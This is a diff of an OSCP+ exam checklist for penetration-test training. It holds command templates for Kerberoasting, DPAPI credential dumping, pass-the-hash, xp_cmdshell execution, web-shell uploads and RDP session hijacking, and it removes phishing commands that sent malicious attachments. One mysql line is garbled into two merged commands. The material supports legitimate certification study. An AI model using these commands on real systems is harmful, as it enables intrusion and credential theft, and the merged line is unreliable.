@@ -5,7 +5,7 @@
 > **Exam-time-only OSCP/OSCP+ operating checklist — offline, version-aware,
 > evidence-driven, and designed for fast decisions under pressure.** Works in:
 > **Obsidian** ✅ | **GitHub** ✅ | **VS Code Preview** ✅ | **Typora** ✅
-> Exam rules last checked against OffSec's official docs: **06 Sep 2026**
+> Exam rules last checked against OffSec's official docs: **23 Sep 2026**
 >
 > **EXAM-ONLY CONTRACT:** This file intentionally excludes study plans, quizzes, simulations,
 > prohibited-tool workflows, and training commands. Search the Decision Desk first; open the
@@ -15,7 +15,7 @@
 
 ## TODAY-LOCK — READ BEFORE TOUCHING A TARGET
 
-Verified **08 Sep 2026** against the current OffSec OSCP+ Exam Guide, FAQ,
+Verified **23 Sep 2026** against the current OffSec OSCP+ Exam Guide, FAQ,
 AI policy, Candidate Handbook, and reporting requirements. The live official
 pages and the exam control panel always override this offline snapshot.
 
@@ -26,14 +26,70 @@ pages and the exam control panel always override this offline snapshot.
 - [ ] Submit every earned flag in the control panel before the attack window ends.
 - [ ] Download exam-environment files only when necessary to compromise a target; delete those local copies after the objective.
 - [ ] Report machines in the required grading/order, use the exact case-sensitive PDF name, place only that PDF in an unencrypted `.7z` under 200 MB, compare MD5, then click **Submit File**.
-- [ ] Contact the proctor immediately for technical problems; log every revert/reset and time.
+- [ ] Keep exam/research activity on the proctored host. Resource searching is fine, but never seek or receive exam assistance; contact the proctor for technical problems and log every revert/reset and time.
+- [ ] Remove/put away phones, tablets and other electronic devices; remove or place away extra monitors/TVs not shared with the proctor.
 
 ```text
 ATTACK WINDOW: 23h45m     REPORT UPLOAD: +24h     PASS: 70/100
 STANDALONES: 3 × 20       AD SET: 40              BONUS: none
 ```
 
-## V19 CREDENTIAL MATERIAL ROUTER
+> **Control-panel authority:** exact target objectives/values come from the Exam Control Panel. Evidence checks should follow the objective actually banked, not assume every machine requires both flags.
+
+
+## V20 — 90-SECOND SERVICE ROUTER
+
+**Use this immediately after the full TCP scan.** Do not turn every open port into a separate rabbit hole. First decide what the service can give you: **identity, files/source, credentials, execution, routing, or a privilege boundary.** Recent pass reports repeatedly emphasize slow service-by-service enumeration, reading the actual output, and rotating when no new evidence appears.
+
+| Signal | First pass | Manual truth / fallback |
+|---|---|---|
+| `80/443/8000/8080/8443/...` HTTP(S) | Open manually → redirects/title/tech → hostname/vhost → routes/content → backups/source → auth/session/input → exact version last | `curl -i/-k` + browser/Burp Free. If discovery is empty, check hostname/vhost, extensions, source maps, backups, app-specific paths before changing wordlists again. |
+| `135/139/445` SMB/RPC | Anonymous/guest → shares → read/write → users/domain clues → known creds with **explicit local/domain scope** → admin separately | `smbclient` / `rpcclient` or one native action. If NetExec disagrees, validate scope, dialect/signing and one real share/file action. |
+| `88/389/445` AD-like set | Establish domain, DC/FQDN, DNS and time first; classify every credential before reuse | Kerberos/LDAP failures are often DNS, realm, bind format, SPN or clock problems—not automatically bad credentials. |
+| `22` SSH | Auth methods/host role → recovered keys/credentials only when justified | `ssh -vvv` explains key, algorithm, permissions and auth-method failures. Do not brute force. |
+| `21` FTP | Anonymous/default → recursive listing → read/write → source/backups/secrets | One `ftp`/`lftp` session is enough to separate login denial from LIST/write denial. |
+| `53` DNS | Nameserver/domain → targeted records → one AXFR attempt → feed names into web/AD | `dig` is the truth check. Failed AXFR is a result; do not spend the exam guessing zones forever. |
+| `389/636/3268/3269` LDAP | Naming context/domain/DC → anonymous or known bind → evidence-driven users/groups/computers/SPNs/ACLs | Raw `ldapsearch` with explicit base DN/FQDN. Fix DNS/TLS/bind/time before switching frameworks. |
+| `5985/5986` WinRM | Use only after a justified Windows credential/token path exists | Authentication, WinRM logon rights, admin and code execution are separate results. Prove context with `whoami /all`. |
+| `1433` MSSQL | Known/default creds when justified → DBs/logins/roles/linked context → execution primitive only after permissions prove it | A successful DB login does not imply OS command execution. Enumerate server/database roles first. |
+| `3306/5432` MySQL/PostgreSQL | Known/default creds when justified → users/roles/databases → files/plugins/program primitives based on permission | Distinguish TLS/auth-plugin/DB-name/`pg_hba` failures from bad credentials. |
+| `3389` RDP | Known/recovered credentials only; local/domain identity explicit | Auth success elsewhere does not prove RDP logon rights. Read the NLA/logon error before retrying. |
+| `111/2049` NFS | Exports → read-only mount first → data → write/UID/GID mapping → secrets/source | RPC visibility is not mount permission; inspect export restrictions/source rules. |
+| unknown port | Banner/TLS/HTTP probe → protocol/product/role → access context | **Never map an unknown port number directly to a CVE.** Identify the protocol first. |
+
+### Failure-proof loop
+
+```text
+1. Read the exact error.
+2. Re-prove reachability.
+3. Re-prove identity/auth format and local-vs-domain scope.
+4. Use one manual/native protocol truth check.
+5. Try one justified alternate implementation.
+6. Record what the result disproved or unlocked.
+7. No new evidence after two decisive tests → park/rotate.
+```
+
+**Tool disagreement is evidence to investigate, not permission to run five more tools.** A wrapper can fail because of DNS, TLS, protocol negotiation, signing, auth formatting, permissions, routing, architecture, or version drift.
+
+### 70-point runway
+
+Current structure remains **3 standalone targets × 20 = 60** and **AD set = 40**; passing threshold is **70/100**. The Exam Control Panel is authoritative for your exact attempt.
+
+```text
+Standalone local.txt      = 10
+Standalone proof.txt step = +10
+AD progress               = 10 / 20 / 40 depending on objectives reached
+
+Examples:
+AD 40 + 3 standalone locals                = 70
+AD 40 + 2 standalone locals + 1 priv-esc   = 70
+AD 20 + 3 locals + 2 standalone priv-esc   = 70
+AD 10 + all 3 standalone machines fully    = 70
+```
+
+The offline app now has **Service Router (Alt+Q)**: paste ports or Nmap-style lines, get a prioritized service queue, manual truth checks, fallback reasoning, role hints, and a live 70-point runway calculator.
+
+## CREDENTIAL MATERIAL ROUTER
 
 Never treat every secret as the same input. Record the source, principal,
 local/domain scope, material type, lockout risk and one justified destination.
@@ -55,12 +111,12 @@ separate result. The **Windows** view in the offline app renders all eight plans
 
 ```bash
 # Ordinary Kerberoast request first; use AES/no-RC4 only when RC4 is disabled
-impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -request -outputfile kerberoast.txt
-impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -request -no-rc4 -outputfile kerberoast-aes.txt
+impacket-GetUserSPNs "$DOMAIN/$USER" -dc-ip "$DC_IP" -request -outputfile kerberoast.txt  # password prompt
+impacket-GetUserSPNs "$DOMAIN/$USER" -dc-ip "$DC_IP" -request -no-rc4 -outputfile kerberoast-aes.txt  # password prompt
 
 # Privileged, late-stage collection only—not initial enumeration
-impacket-dpapidump -creds -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS@$TARGET_HOST"
-impacket-dpapidump -sccm -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS@$TARGET_HOST"
+impacket-dpapidump -creds -dc-ip "$DC_IP" "$DOMAIN/$USER@$TARGET_HOST"  # password prompt
+impacket-dpapidump -sccm -dc-ip "$DC_IP" "$DOMAIN/$USER@$TARGET_HOST"  # password prompt
 ```
 
 Use the installed `-h` as syntax authority. Impacket 0.13.1 also improves SMB/
@@ -69,13 +125,13 @@ key-credential handling and BadSuccessor reliability. `impacket-smbclient` now
 has improved DFS/listing behavior and recursive `rget`; download only files
 necessary for the objective.
 
-### Stable tool lock (re-checked 08 Sep 2026)
+### Reference tool snapshot (verify locally before the exam)
 
 | Tool | Stable/reference version | Exam-time decision |
 |---|---:|---|
 | Impacket | 0.13.1 | Current wrapper/help wins; use the new deltas above only when prerequisites match |
-| NetExec | 1.5.1 | Do not use `spider_plus` on an older build; V19 core paths do not need that module |
-| BloodHound CE | 9.6.0 | Stable choice; 9.7.0 is still a release candidate, so do not switch the exam stack to it |
+| NetExec | 1.5.1 | Do not use `spider_plus` on an older build; core paths do not need that module |
+| BloodHound CE | Upstream stable: 9.7.1; Kali rolling package: 9.7.0~rc4 | Upstream and Kali packaging can differ. Do not upgrade a known-good exam stack merely to chase a version; verify the installed `bloodhound-start` workflow locally |
 | BloodHound CE Python collector | 1.9.1 | Use `bloodhound-ce-python` for CE, not the legacy collector by assumption |
 | RustHound-CE | local `-V` / `-h` | Cross-platform CE-compatible collector; alternative to SharpHound / `bloodhound-ce-python` when useful |
 | Certipy | 5.1.0 | Current stable command family; verify local `certipy -h` / `-v` |
@@ -111,10 +167,10 @@ when it answers a specific question.
 
 ```powershell
 # Local account: prove the resulting context first.
-.\RunasCs.exe user1 'Password1!' "cmd /c whoami /all"
+.\RunasCs.exe $AUTH_USER '$AUTH_PASS' "cmd /c whoami /all"
 
 # Domain account. Start with a harmless identity check.
-.\RunasCs.exe user1 'Password1!' "cmd /c whoami /all" -d domain.local
+.\RunasCs.exe $AUTH_USER '$AUTH_PASS' "cmd /c whoami /all" -d $DOMAIN
 
 # If behavior differs by host/token, trust the binary's local help.
 .\RunasCs.exe --help
@@ -215,7 +271,7 @@ problem instead of the target.
   Use only if already available and a specific unresolved AD question justifies
   them. Their findings are leads; manually prove the exact permission/path.
 
-### V20 fallback decision rule
+### Fallback decision rule
 
 ```text
 native/manual proof works?       → keep it; do not add tools
@@ -229,9 +285,9 @@ Empire/Covenant available?       → allowed tool != every feature allowed
 ```
 
 
-## V19 TARGET HANDOFF + ACCESS TRUTH LAYER
+## TARGET HANDOFF + ACCESS TRUTH LAYER
 
-The V19 web app adds these two small exam-time controls without adding another
+The web app adds these two small exam-time controls without adding another
 screen. They solve two expensive errors: forgetting the exact return path after
 rotating targets, and mistaking an accepted credential for useful or privileged
 access.
@@ -261,7 +317,7 @@ RE-ENTRY / RECOVERY:
 ```
 
 Use credential **labels** or environment-variable names in this packet—never a
-raw password, NT hash, ticket, certificate key or private key. V19 blocks common
+raw password, NT hash, ticket, certificate key or private key. The app blocks common
 secret patterns from being saved or copied here. The credential vault/session
 controls remain the correct place for intentionally managed secrets.
 
@@ -286,7 +342,7 @@ you actually observed on each exposed protocol:
 | Privileged / admin control | Effective privileged control was proved | Stop and bank valid original-path proof/report evidence |
 
 NetExec's successful-login marker and its `Pwn3d!` marker are deliberately kept
-separate in V19. Upstream NetExec documentation describes `Pwn3d!` differently
+separate in this checklist. Upstream NetExec documentation describes `Pwn3d!` differently
 by protocol; for example, SMB/WMI generally imply local-administrator capability,
 while WinRM/RDP indicate at least code execution. Always validate the actual
 token and the exact action. A remote command is not automatically an interactive
@@ -306,8 +362,8 @@ nxc smb "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --shares
 nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --users
 evil-winrm -i "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS"
 xfreerdp /v:"$TARGET" /u:"$AUTH_USER" /d:"$DOMAIN" /p:"$AUTH_PASS" /cert:ignore +clipboard
-impacket-mssqlclient "$DOMAIN/$AUTH_USER:$AUTH_PASS@$TARGET" -windows-auth
-impacket-wmiexec "$DOMAIN/$AUTH_USER:$AUTH_PASS@$TARGET" "whoami /all"
+impacket-mssqlclient "$DOMAIN/$AUTH_USER@$TARGET" -windows-auth  # password prompt; avoids @/: parser ambiguity
+impacket-wmiexec "$DOMAIN/$AUTH_USER@$TARGET" "whoami /all"  # password prompt
 ```
 
 Do not turn this into a broad spray. Prefer protocols already shown as exposed,
@@ -319,7 +375,7 @@ OffSec guide/FAQ and exam control-panel objectives remain authoritative.
 <summary>🧠 READ THIS FIRST — 2026 OSCP+ EXAM OPERATING SYSTEM</summary>
 
 ```text
-EXAM STRUCTURE (OffSec guide checked 06 Sep 2026)
+EXAM STRUCTURE (OffSec guide checked 23 Sep 2026)
 
 3 stand-alone machines = 60 pts total
   └─ each machine: 10 initial access + 10 privilege escalation
@@ -419,7 +475,7 @@ If none of those changed for 20–30 minutes, you are probably repeating a hypot
 8. STABILIZE     interactive shell, identity, hostname, interfaces, routes
 9. ENUMERATE     local users, privileges, secrets, services, jobs, apps, internal listeners
 10. ESCALATE     prove one writable/controllable edge; back up before modification
-11. FAN OUT      test each new credential on appropriate exposed in-scope services; respect lockout policy
+11. CRED COVERAGE classify material, then test only appropriate exposed in-scope services; respect lockout policy
 12. PROVE        flag from original location + target IP in the same interactive-shell screenshot
 13. RECORD       exact commands, output, changes, source URL, timestamps, screenshots
 14. REPEAT       new access changes the surface; re-enumerate, re-collect AD, then close the target
@@ -512,8 +568,9 @@ READ ORIGINAL → BACK UP / HASH → WRITE ROLLBACK → MINIMUM CHANGE
 | Web discovery | Feroxbuster | `feroxbuster -u http://$HOST/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,asp,aspx,jsp,txt,bak` | FFUF/Gobuster; robots/sitemap/source/manual traversal |
 | Precise fuzzing | FFUF | `ffuf -u http://$HOST/FUZZ -w WORDLIST -ac` | Feroxbuster/Gobuster; calibrate soft-404 responses manually |
 | HTTP replay | Burp Community | Send one request to Repeater and change one input at a time | curl with saved headers/cookies |
-| SMB/auth | NetExec | `nxc smb $IP -u "$USER" -p "$PASS" --shares` | `smbclient`, `rpcclient`, `enum4linux-ng` |
+| SMB/auth | NetExec | `nxc smb $IP -u "$USER" -p "$PASS" --shares` | `smbclient-ng` for fast interactive share triage; `smbclient`, `rpcclient`, `enum4linux-ng` for native/manual proof |
 | LDAP | ldapsearch | `ldapsearch -x -H ldap://$DC_IP -s base namingContexts` | NetExec LDAP, PowerView, ldeep |
+| AD username pattern | Built-in app generator / Username Anarchy | Turn evidence-derived real names into a small candidate list; infer one observed convention when possible | Manual first.last / flast variants; validate usernames with Kerberos/LDAP/RPC before any password testing |
 | AD paths | BloodHound CE | Collect after every new identity; inspect outgoing control and sessions | RustHound-CE / SharpHound / `bloodhound-ce-python` collectors; PowerView/LDAP/manual ACE validation |
 | AD CS | Certipy | `certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -enabled -vulnerable -stdout` | LDAP/PowerView/certutil; prove template, CA and enrollment prerequisites |
 | Kerberos/remote exec | Impacket | Use the single helper that matches the proven objective | Rubeus/native Windows tools; fix DNS/time/user format first |
@@ -531,23 +588,27 @@ READ ORIGINAL → BACK UP / HASH → WRITE ROLLBACK → MINIMUM CHANGE
 
 **Syntax rule:** the installed tool's `-h` / `--help` and version output win over a copied command. Current high-drift examples are NetExec, BloodHound collectors, Certipy, Impacket wrappers, FreeRDP and Ligolo-ng.
 
-### 0.4 Credential fan-out — do this after every new credential
+**Secret-handling rule:** commands containing `$PASS`, `$AUTH_PASS`, `$NTHASH`, `$AES256`, ticket paths or key paths are **templates**. Prefer an interactive password prompt when the client supports it; do not save real secrets in the static notes.
+
+### 0.4 Credential validation — prove one host/service, then expand from evidence
 
 ```bash
-# Record: source, identity, secret/hash type, where found, timestamp, validated services
-nxc smb  $TARGETS -u "$USER" -p "$PASS" -d "$DOMAIN" --continue-on-success
-nxc winrm $TARGETS -u "$USER" -p "$PASS" -d "$DOMAIN"
-nxc rdp   $TARGETS -u "$USER" -p "$PASS" -d "$DOMAIN"
-nxc ldap  $DC_IP   -u "$USER" -p "$PASS" -d "$DOMAIN"
+# Record: source, identity, secret/hash type, where found, timestamp, validated services.
+# Start with ONE justified target/service. Do not turn a newly found secret into an automatic spray.
+nxc smb   $IP    -u "$USER" -p "$PASS" -d "$DOMAIN"
+nxc winrm $IP    -u "$USER" -p "$PASS" -d "$DOMAIN"
+nxc ldap  $DC_IP -u "$USER" -p "$PASS" -d "$DOMAIN"
 
-# Native/manual authorization checks
-smbclient -L //$IP/ -U "$DOMAIN/$USER%$PASS"
-rpcclient -U "$DOMAIN/$USER%$PASS" $IP
-evil-winrm -i $IP -u "$USER" -p "$PASS"
+# Native/manual authorization checks — prompt for passwords instead of saving them in the command.
+smbclient -L "//$IP/" -U "$DOMAIN/$USER"
+rpcclient -U "$DOMAIN/$USER" "$IP"
 ssh "$USER@$IP"
+
+# Local Windows account: omit -d and add --local-auth to the matching NetExec protocol.
+# After one success, use Credential Debt / observed reachability to choose the next host — not $TARGETS by default.
 ```
 
-Authentication success does not prove administrative access. Record **protocol + host + auth result + authorization level** separately. Before any password spray, obtain policy, keep the list tiny, and calculate lockout risk.
+Authentication success does not prove administrative access. Record **protocol + host + auth result + authorization level** separately. Before any list-driven authentication, obtain policy, keep the candidate set evidence-derived, and calculate lockout risk.
 
 ### 0.5 Mini attack trees
 
@@ -764,7 +825,7 @@ read exact error
 <summary>🚫 2026 EXAM RULES — READ BEFORE USING ANY TOOL</summary>
 
 > **This block overrides older habits in the rest of the notes.**
-> Checked against the OffSec OSCP+ Exam Guide, FAQ and AI policy on 06 Sep 2026.
+> Checked against the OffSec OSCP+ Exam Guide, FAQ and AI policy on 23 Sep 2026.
 
 ### Prohibited on the OSCP+ exam
 
@@ -855,7 +916,7 @@ Official references:
     18.  Reporting & Documentation
     19.  Quick Reference Card
     20.  Exam Day Checklist
-    🔥  Bonus: Most Missed Tricks
+    🔥  Most Missed Tricks
 
 
 </details>
@@ -936,7 +997,6 @@ function newbox() {
 ``` bash
 # Record everything
 script -q -c "zsh" ~/oscp/$IP/terminal_$(date +%Y%m%d_%H%M).log
-
 # Start session
 tmux new -s oscp
 
@@ -996,7 +1056,7 @@ tmux new -s oscp
 # SNMP
 /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
 
-# FTP/SSH/SMB bruteforce
+# Default-credential shortlist source — policy/rate-limit review first; prefer one justified pair on one host.
 /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
 ```
 
@@ -1056,7 +1116,7 @@ gem install wpscan
     [ ] Known good shells: nc listener test, msfvenom test payload
     [ ] Clock started — note exam end time
     [ ] ProtonVPN/any other VPN DISCONNECTED (use only exam VPN)
-    [ ] Phone on silent — no interruptions
+    [ ] Phone/tablet/other electronic devices removed or put away; no extra unshared monitor/TV
     [ ] Water, snacks ready
 
 
@@ -1089,8 +1149,9 @@ arp-scan -l
 # fping
 fping -a -g 10.10.10.0/24 2>/dev/null
 
-# Range discovery only when scope/routing justifies it; validate every result with Nmap
-masscan -p0-65535 10.10.10.0/24 --rate=10000
+# Range discovery only when the Exam Control Panel scope/routing explicitly justifies it.
+# Start conservatively; validate interesting results with Nmap.
+masscan -p0-65535 $SCOPE_CIDR --rate=1000
 ```
 
 
@@ -1289,17 +1350,18 @@ ftp $IP
 # user: anonymous  pass: (blank) or anonymous@domain.com or press Enter
 ftp> ls -la              # Show hidden files
 ftp> pwd                 # Where are we?
-ftp> binary              # ALWAYS set binary mode before downloading
-ftp> get file.txt
-ftp> mget *              # Get all files
-ftp> put shell.php       # Upload if writable!
+ftp> binary              # Set binary mode before an allowed targeted retrieval
+ftp> get NECESSARY_FILE  # ONLY if this exact file is necessary to compromise the target
+ftp> put shell.php       # Upload if writable and justified by your attack path
 ftp> passive             # Toggle passive mode if connection issues
 
-# ── RECURSIVE DOWNLOAD ALL ────────────────────────────────────
-wget -m --no-passive ftp://anonymous:anonymous@$IP
-wget -m ftp://user:pass@$IP
-# List the root directory without embedding credentials in shell history:
+# ── LIST FIRST; DO NOT BULK-MIRROR THE SHARE ─────────────────
+# Current OSCP+ guidance forbids downloading exam files/source locally unless
+# necessary to compromise the machine. Enumerate names first, then retrieve only
+# the exact justified artifact and delete the local copy after the objective.
 curl --user 'anonymous:' --list-only "ftp://$IP/"
+# Example only when necessary:
+# curl --user 'anonymous:' "ftp://$IP/path/NECESSARY_FILE" -o loot/NECESSARY_FILE
 
 # ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
 # Confirm scope + lockout policy; use only a small, evidence-derived shortlist.
@@ -1437,18 +1499,13 @@ VRFY www-data
 EXPN root       # Expand alias
 RCPT TO:root    # Check if user exists
 
-# ── SEND PHISHING MAIL (if open relay) ────────────────────────
-swaks --to victim@domain.com --from admin@domain.com --server $IP
-swaks --to victim@domain.com --from admin@domain.com --server $IP \
-      --body "Click: http://$LHOST/file" --header "Subject: Important"
-
-# ── MAIL WITH ATTACHMENT (Phishing) ───────────────────────────
-swaks --to victim@domain.com --from admin@domain.com --server $IP \
-      --attach /path/to/malicious.file --header "Subject: Report"
+# ── RELAY / RECIPIENT CAPABILITY CHECK — NO MESSAGE DELIVERY ──
+# Stop at RCPT: learn whether the server accepts the envelope without sending content.
+swaks --server "$IP" --from "probe@$DOMAIN" --to "probe@$DOMAIN" --quit-after RCPT
 
 # ── RELAY TEST ────────────────────────────────────────────────
 nmap --script smtp-open-relay $IP -p25
-# If relay open → use to enumerate internal users, phish, or pivot
+# If relay is open, record the capability. Use it only when it directly supports an in-scope objective and the current exam rules permit the exact action.
 ```
 
 
@@ -1480,7 +1537,7 @@ dnsrecon -d domain.com -t axfr -n $IP
 
 # ── REVERSE DNS ───────────────────────────────────────────────
 dig -x $IP @$IP
-nmap -R -sL $IP/24    # Reverse lookup entire subnet
+nmap -R -sL $SCOPE_CIDR    # Reverse lookup the exact in-scope CIDR only
 
 # ── SUBDOMAIN BRUTE FORCE ─────────────────────────────────────
 dnsrecon -d domain.com -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt -n $IP
@@ -1551,6 +1608,8 @@ curl -s http://$IP/robots.txt
 curl -s http://$IP/sitemap.xml
 curl -s http://$IP/.git/HEAD            # Exposed git repo!
 curl -s http://$IP/.git/config
+# Rule note: do not reconstruct/download exposed source locally unless it is necessary
+# to compromise this target; delete the local copy after the objective.
 curl -s http://$IP/.env                 # Environment vars
 curl -s http://$IP/config.php
 curl -s http://$IP/phpinfo.php
@@ -1653,41 +1712,38 @@ nxc smb $IP --shares -u 'guest' -p ''
 
 # ── CONNECT TO SHARES ─────────────────────────────────────────
 smbclient //$IP/SHARE -N
-smbclient //$IP/SHARE -U "user%password"
-smbclient //$IP/SHARE -U "domain\\user%password"
-# Inside smbclient:
-smb: \> ls              # List
-smb: \> recurse ON      # Enable recursive
-smb: \> ls              # Now lists recursively
-smb: \> prompt OFF      # Disable confirmation
-smb: \> mget *          # Download everything
-smb: \> put shell.asp   # Upload shell
+smbclient "//$IP/SHARE" -U "user"           # password prompt
+smbclient "//$IP/SHARE" -U "domain\\user"   # password prompt
+# Inside smbclient — enumerate remotely before retrieving anything:
+smb: \> ls              # List current directory
+smb: \> recurse ON      # Make subsequent ls recursive (listing only)
+smb: \> ls              # Inspect names/paths without bulk retrieval
+smb: \> get NECESSARY_FILE   # ONLY if this exact file is necessary to compromise the target
+smb: \> put shell.asp   # Upload only when justified by your attack path
 
-# ── RECURSIVE DOWNLOAD ALL ────────────────────────────────────
-smbclient //$IP/SHARE -N -c 'recurse;prompt;mget *'
-smbget -R smb://$IP/SHARE -U 'user%pass'
-# Mount (easier for browsing):
-mkdir /mnt/smb
-mount -t cifs //$IP/SHARE /mnt/smb -o user=,password=
-mount -t cifs //$IP/SHARE /mnt/smb -o user=user,password=pass,domain=DOMAIN
+# Non-interactive recursive LISTING (no bulk mget):
+smbclient //$IP/SHARE -N -c 'recurse;ls'
+# If one exact remote artifact is necessary, retrieve only that path and delete
+# the local copy after the objective. Do not mirror/mget an entire share.
 
 # ── FULL ENUMERATION ──────────────────────────────────────────
 enum4linux -a $IP 2>/dev/null | tee scans/smb/enum4linux.txt
 enum4linux-ng $IP -A -oA scans/smb/enum4linux-ng 2>/dev/null
 
 # nxc full sweep
-nxc smb $IP -u user -p pass --shares
-nxc smb $IP -u user -p pass --sessions
-nxc smb $IP -u user -p pass --users
-nxc smb $IP -u user -p pass --groups
-nxc smb $IP -u user -p pass --computers
-nxc smb $IP -u user -p pass --loggedon-users
-nxc smb $IP -u user -p pass --disks
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --shares
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --sessions
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --users
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --groups
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --computers
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --loggedon-users
+nxc smb $IP -u "$AUTH_USER" -p "$AUTH_PASS" --disks
 nxc smb $IP -u '' -p '' --rid-brute
 
 
 # ── VULNERABILITY CHECKS ──────────────────────────────────────
-nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve2009-3103,smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos -p445 $IP
+nmap -Pn -n -p445 --script smb-protocols,smb2-security-mode,smb2-time,smb-os-discovery $IP
+# Then run ONE exact smb-vuln-* check only when SMB/OS evidence justifies that specific hypothesis.
 
 # EternalBlue (MS17-010) manual check:
 python3 checker.py $IP    # From exploit repo
@@ -1730,8 +1786,8 @@ ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com"
 ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=*)" > scans/ldap/anon_dump.txt
 
 # ── AUTHENTICATED ─────────────────────────────────────────────
-ldapsearch -x -H ldap://$IP -D "cn=user,dc=domain,dc=com" -w pass -b "dc=domain,dc=com"
-ldapsearch -x -H ldap://$IP -D "domain\\user" -w pass -b "dc=domain,dc=com" "(objectClass=user)"
+ldapsearch -x -H ldap://$IP -D "cn=user,dc=domain,dc=com" -W -b "dc=domain,dc=com"
+ldapsearch -x -H ldap://$IP -D "domain\\user" -W -b "dc=domain,dc=com" "(objectClass=user)"
 
 # ── USEFUL LDAP QUERIES ───────────────────────────────────────
 # All users:
@@ -1752,7 +1808,7 @@ ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(userAccountControl:1.2.840.1
 ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=user)" description sAMAccountName | grep -A1 "description:"
 
 # ── LDAPDOMAINDUMP ────────────────────────────────────────────
-ldapdomaindump -u 'domain\user' -p 'pass' $IP -o loot/ldap/
+ldapdomaindump -u "$DOMAIN\$AUTH_USER" -p "$AUTH_PASS" $IP -o loot/ldap/
 # Creates HTML/JSON/grep-able files of all objects
 
 # ── TIPS ──────────────────────────────────────────────────────
@@ -1838,7 +1894,7 @@ nmap --script rpcinfo -p111 $IP
 
 # ── RPCCLIENT (135) ───────────────────────────────────────────
 rpcclient -U "" -N $IP         # Null session
-rpcclient -U "user%pass" $IP
+rpcclient -U "$AUTH_USER" "$IP"  # password prompt
 
 # Useful rpcclient commands:
 rpcclient> srvinfo               # Server info
@@ -1940,8 +1996,7 @@ snmpwalk -c public -v2c $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull
 
 ``` bash
 # ── CONNECT ───────────────────────────────────────────────────
-mysql -h $IP -u root -p
-mysql -h $IP -u root --password=''
+mysql -h $IP -u root -pmysql -h $IP -u root --password=''
 mysql -h $IP -u root --password=root
 mysql -h $IP -u '' --password=''     # Anonymous
 
@@ -1998,9 +2053,9 @@ nmap --script mysql-info,mysql-databases,mysql-users,mysql-empty-password -p3306
 
 ``` bash
 # ── CONNECT ───────────────────────────────────────────────────
-impacket-mssqlclient domain/user:pass@$IP
-impacket-mssqlclient user:pass@$IP -windows-auth     # Windows auth
-impacket-mssqlclient user:pass@$IP -port 1433
+impacket-mssqlclient domain/user@$IP
+impacket-mssqlclient user@$IP -windows-auth     # Windows auth
+impacket-mssqlclient user@$IP -port 1433
 
 # ── ENUMERATION ───────────────────────────────────────────────
 SELECT @@version;
@@ -2037,8 +2092,8 @@ SELECT * FROM t;
 
 # ── NMAP + CME ────────────────────────────────────────────────
 nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p1433 $IP
-nxc mssql $IP -u user -p pass -q "SELECT @@version"
-nxc mssql $IP -u user -p pass --local-auth -q "EXEC xp_cmdshell 'whoami'"
+nxc mssql $IP -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" -q "SELECT @@version"
+nxc mssql $IP -u "$AUTH_USER" -p "$AUTH_PASS" --local-auth -q "EXEC xp_cmdshell 'whoami'"
 ```
 
 
@@ -2061,13 +2116,13 @@ nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 $IP -p3389
 nmap --script rdp-enum-encryption -p3389 $IP
 
 # ── CONNECT ───────────────────────────────────────────────────
-xfreerdp /u:user /p:pass /v:$IP
-xfreerdp /u:user /p:pass /v:$IP +clipboard              # Enable clipboard
-xfreerdp /u:user /p:pass /v:$IP /drive:kali,/tmp        # Mount /tmp as share
-xfreerdp /u:user /p:pass /v:$IP /dynamic-resolution /cert-ignore
+xfreerdp /u:"$AUTH_USER" /d:"$DOMAIN" /v:$IP
+xfreerdp /u:"$AUTH_USER" /d:"$DOMAIN" /v:$IP +clipboard              # Enable clipboard
+xfreerdp /u:"$AUTH_USER" /d:"$DOMAIN" /v:$IP /drive:kali,/tmp        # Mount /tmp as share
+xfreerdp /u:"$AUTH_USER" /d:"$DOMAIN" /v:$IP /dynamic-resolution /cert-ignore
 xfreerdp /u:Administrator /pth:NTLMHASH /v:$IP          # Pass-the-hash!
-rdesktop -u user -p pass $IP -g 1280x720
-rdesktop -u user -p pass $IP -r disk:share=/tmp         # Mount share
+rdesktop -u "$AUTH_USER" $IP -g 1280x720
+rdesktop -u "$AUTH_USER" $IP -r disk:share=/tmp         # Mount share
 
 # ── PASS-THE-HASH RDP ─────────────────────────────────────────
 # Requires: Restricted Admin Mode enabled on target
@@ -2112,13 +2167,13 @@ tscon 1 /dest:console   # Hijack another user's session!
 ``` bash
 # ── CHECK IF ACCESSIBLE ───────────────────────────────────────
 nmap -p5985,5986 $IP
-nxc winrm $IP -u user -p pass
+nxc winrm $IP -u "$AUTH_USER" -p "$AUTH_PASS"
 
 # ── EVIL-WINRM (best tool) ────────────────────────────────────
-evil-winrm -i $IP -u user -p pass
+evil-winrm -i $IP -u "$AUTH_USER" -p "$AUTH_PASS"
 evil-winrm -i $IP -u user -H NTLMHASH          # PtH
